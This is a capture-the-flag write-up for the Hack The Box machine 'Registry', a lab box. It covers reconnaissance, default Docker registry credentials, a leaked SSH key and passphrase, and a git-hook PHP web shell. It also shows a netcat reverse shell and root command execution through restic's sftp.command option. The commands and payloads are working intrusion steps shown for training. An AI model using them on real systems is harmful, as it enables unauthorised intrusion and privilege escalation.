---
layout: single
title: Registry - Hack The Box
excerpt: "This writeup is outdated and the attack path presented for user bolt has been patched. Initially once we pivoted from the bolt user to www-data we could run restic as root and abuse the sftp.command parameter to execute any command as root."
date: 2020-04-03
classes: wide
header:
  teaser: /assets/images/htb-writeup-registry/registry_logo.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:
  - docker
  - registry
  - restic
  - unintended
---

![](/assets/images/htb-writeup-registry/registry_logo.png)

This writeup is outdated and the attack path presented for user bolt has been patched. Initially once we pivoted from the bolt user to www-data we could run restic as root and abuse the sftp.command parameter to execute any command as root.

## Portscan

```
root@kali:~# nmap -T4 -sC -sV -p- 10.10.10.159
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-20 19:05 EDT
Nmap scan report for registry.htb (10.10.10.159)
Host is up (0.044s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Welcome to nginx!
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.27 seconds
```

## Website

There's a default nginx page shown on both port 80 and port 443:

![](/assets/images/htb-writeup-registry/Screenshot_1.png)

The SSL certificate contains `docker.registry.htb` which I'll add to my `/etc/hosts` file.

## Website dirbust

```
root@kali:~# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt -e php --no-banner \
> -u http://registry.htb
~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~

[?] Started at	: 2019-10-20 19:09:36

GET	403 Forbidden			http://registry.htb/.bash_history
GET     403 Forbidden                   http://registry.htb/.htaccess
GET     403 Forbidden                   http://registry.htb/.htpasswd
GET     200 OK                          http://registry.htb/backup.php
GET     301 Moved Permanently           http://registry.htb/install
						=> http://registry.htb/install/
```

The `/backup.php` page doesn't display anything with my web browser. Maybe it's supposed to be included as part of another file or it does something in the background but doesn't output anything.

The `/install` link shows a bunch of gibberish so it's probably a binary file that I'm supposed to download and analyze.

![](/assets/images/htb-writeup-registry/Screenshot_2.png)

## Hint from the compressed archive

I figure out that it's a compressed file by running `file` then I can extract it and see it contains a certificate and a readme file.

```
root@kali:~/htb/registry# file install
install: gzip compressed data, last modified: Mon Jul 29 23:38:20 2019

root@kali:~/htb/registry# mv install install.tar.gz
root@kali:~/htb/registry# tar xvf install.tar.gz 

gzip: stdin: unexpected end of file
ca.crt
readme.md
tar: Child returned status 1
tar: Error is not recoverable: exiting now
```

`readme.md` contains some kind of hint as to what the box is about: docker has a private registry software

```
# Private Docker Registry

- https://docs.docker.com/registry/deploying/
- https://docs.docker.com/engine/security/certificates/
```

## Docker registry

When I got to `https://docker.registry.htb/` I just see a blank page so I'll run gobuster again to find files.

```
root@kali:~/htb/registry# rustbuster dir -w /opt/SecLists/Discovery/Web-Content/big.txt --no-banner \
> -k -u https://docker.registry.htb
~ rustbuster v3.0.3 ~ by phra & ps1dr3x ~

[?] Started at	: 2019-10-20 19:19:10

GET     301 Moved Permanently           https://docker.registry.htb/v2
						=> /v2/
```

The `/v2` page has HTTP basic auth but I was able to guess the `admin / admin` credentials. However I get an empty JSON object when I query the page.

```
root@kali:~/htb/registry# curl -u admin:admin -k https://docker.registry.htb/v2/
{}
```

I'm pretty sure this a Docker Registry installation based on the name of the box, the hint from the file and the directory discovered.

To interact with the registry without doing API calls manually I'll use the [registry-cli](https://github.com/andrey-pohilko/registry-cli) tool.

```
root@kali:~/htb/registry# registry.py -l admin:admin -r https://docker.registry.htb --no-validate-ssl
---------------------------------
Image: bolt-image
  tag: latest
```

There's a docker image called `bolt-image` present in the registry. I'll download it to my own box so I can execute it and see if there is anything interesting in it. 

```
root@kali:~/htb/registry# docker login -u admin -p admin docker.registry.htb
WARNING! Using --password via the CLI is insecure. Use --password-stdin.
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
root@kali:~/htb/registry# docker pull docker.registry.htb/bolt-image:latest
latest: Pulling from bolt-image
f476d66f5408: Pull complete 
8882c27f669e: Pull complete 
d9af21273955: Pull complete 
f5029279ec12: Pull complete 
2931a8b44e49: Pull complete 
c71b0b975ab8: Pull complete 
02666a14e1b5: Pull complete 
3f12770883a6: Pull complete 
302bfcb3f10c: Pull complete 
Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b
Status: Downloaded newer image for docker.registry.htb/bolt-image:latest
```

I'll launch the container in interactive mode so I can look around easily:

```
root@kali:~/htb/registry# docker image list
REPOSITORY                       TAG                 IMAGE ID            CREATED             SIZE
anoxis/registry-cli              latest              c8ecf313a6be        2 months ago        73.6MB
docker.registry.htb/bolt-image   latest              601499e98a60        4 months ago        362MB
root@kali:~/htb/registry# docker run -ti 601499e98a60 /bin/bash
root@4195e2eb99fe:/# 
```

There's an encrypted SSH private key in `/root/.ssh`:

```
root@4195e2eb99fe:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,1C98FA248505F287CCC597A59CF83AB9

KF9YHXRjDZ35Q9ybzkhcUNKF8DSZ+aNLYXPL3kgdqlUqwfpqpbVdHbMeDk7qbS7w
KhUv4Gj22O1t3koy9z0J0LpVM8NLMgVZhTj1eAlJO72dKBNNv5D4qkIDANmZeAGv
[...]
RLI9xScv6aJan6xHS+nWgxpPA7YNo2rknk/ZeUnWXSTLYyrC43dyPS4FvG8N0H1V
94Vcvj5Kmzv0FxwVu4epWNkLTZCJPBszTKiaEWWS+OLDh7lrcmm+GP54MsLBWVpr
-----END RSA PRIVATE KEY-----
```

There's a profile file containing the SSH password for the private key:

```
root@4195e2eb99fe:/etc/profile.d# ls -l
total 8
-rw-r--r-- 1 root root  96 Aug 20  2018 01-locale-fix.sh
-rwxr-xr-x 1 root root 222 May 25 01:25 01-ssh.sh
root@4195e2eb99fe:/etc/profile.d# cat 01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```

Password is: `GkOcz221Ftb3ugog`

There's also a `sync.sh` but it doesn't seem to do anything:

```
root@4195e2eb99fe:/var/www/html# cat sync.sh
#!/bin/bash
rsync -azP registry:/var/www/html/bolt .
```

## Login in as user bolt

With the private key and password I found I'm able to SSH to the box with the user `bolt`:
```
root@kali:~/htb/registry# ssh -i id_rsa bolt@10.10.10.159
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-29-generic x86_64)
Last login: Sun Oct 20 23:05:17 2019 from 10.10.14.20
bolt@bolt:~$ id
uid=1001(bolt) gid=1001(bolt) groups=1001(bolt)
bolt@bolt:~$ cat user.txt
ytc0ytdmnzywnzgxngi0zte0otm3ywzi
```

## Enumeration as user bolt

The `backup.php` file I found earlier executes a backup application with sudo:

```
bolt@bolt:/var/www/html$ cat backup.php
<?php shell_exec("sudo restic backup -r rest:http://backup.registry.htb/bolt bolt");
```

Unfortunately my current `bolt` doesn't have rights to sudo that specific command but I have the following:

```
bolt@bolt:/var/www/html$ sudo -l
Matching Defaults entries for bolt on bolt:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User bolt may run the following commands on bolt:
    (git) NOPASSWD: /usr/bin/git checkout *
```

## Escalating to www-data using the git post-checkout hooks

Since I can execute git checkout as user `git` I can exploit the post-checkout hooks to get RCE. I'll just create a webshell so I can run commands as `www-data`:

```
bolt@bolt:/var/tmp$ cd /var/tmp
bolt@bolt:/var/tmp$ mkdir a
bolt@bolt:/var/tmp$ cd a
bolt@bolt:/var/tmp/a$ git init
Initialized empty Git repository in /var/tmp/a/.git/
bolt@bolt:/var/tmp/a$ touch blabla
bolt@bolt:/var/tmp/a$ git add blabla
bolt@bolt:/var/tmp/a$ git commit -m 'yo'

*** Please tell me who you are.

Run

  git config --global user.email "you@example.com"
  git config --global user.name "Your Name"

to set your account's default identity.
Omit --global to set the identity only in this repository.

fatal: empty ident name (for <bolt@bolt>) not allowed
bolt@bolt:/var/tmp/a$ vi .git/hooks/post-checkout
bolt@bolt:/var/tmp/a$ chmod 755 .git/hooks/post-checkout
bolt@bolt:/var/tmp/a$ chmod -R 777 *
bolt@bolt:/var/tmp/a$ chmod -R 777 .git/
bolt@bolt:/var/tmp/a$ sudo -u git /usr/bin/git checkout * 
error: unable to unlink old 'blabla': Permission denied
bolt@bolt:/var/tmp/a$ ls -l /var/www/html/snow.php
-rw-r--r-- 1 git www-data 29 Oct 20 23:43 /var/www/html/snow.php

bolt@bolt:/var/tmp/a$ cat /var/www/html/snow.php 
<?php system($_GET["c"]) ?>;
```

![](/assets/images/htb-writeup-registry/Screenshot_4.png)

I tried to get a reverse shell but I couldn't so I assume there is a firewall blocking outbound connection. No matter, there is netcat already on the box so I can start a local listener as user `bolt` and proceed from there. I created a `/tmp/shell.sh` that contains a standard reverse shell using netcat and called it from my webshell. 


```
bolt@bolt:~$ nc -lvnp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from 127.0.0.1 60286 received!
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Privilege escalation

More sudo privileges! This is probably the way to get root access. I need to abuse the restic backup system to get RCE as root.

```
$ sudo -l
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:[...]

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

## Unintended method

We can pass special parameters to the restic backup application to specify how we want to establish the SSH connection for remote backups. By abusing this parameter we can effectively run any command we want as root. In this case I'll just call another reverse shell back to me and gain root access.

`sudo /usr/bin/restic backup -r rest/ -r sftp:bolt@127.0.0.1:/var/tmp/xyz -o sftp.command="/tmp/shell.sh" /root/root.txt`

